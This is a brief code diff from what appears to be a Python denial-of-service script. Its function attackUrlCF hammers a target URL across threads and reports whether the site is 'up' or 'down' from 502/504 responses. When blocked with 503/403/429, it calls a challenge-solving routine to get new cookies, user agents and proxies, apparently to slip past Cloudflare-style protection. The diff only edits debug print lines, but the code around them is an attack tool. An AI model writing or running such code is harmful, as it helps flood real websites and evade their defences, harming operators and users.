@@ -112,13 +112,14 @@ def attackUrlCF(baseUrl, threadNumber):
 				if str(r.status_code) in ['502', '504']:					
 					isClear = False
 			if isClear:
+				print(res[0].content)
 				print('threadNum: ' + str(threadNumber), 'up.....')
 			else:
 				print(str(threadNumber), 'down!!!!!')
 			# print('threadNum: ' + str(threadNumber))
 			# print(res[0].content)
 			if str(res[0].status_code) in ['503', '403', '429']:
-				print(str(threadNumber), 'blockeddd', res[0].content)
+				print(str(threadNumber), 'blockeddd', res[0])
 				cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
 				print(str(threadNumber), 'resolved')
 			
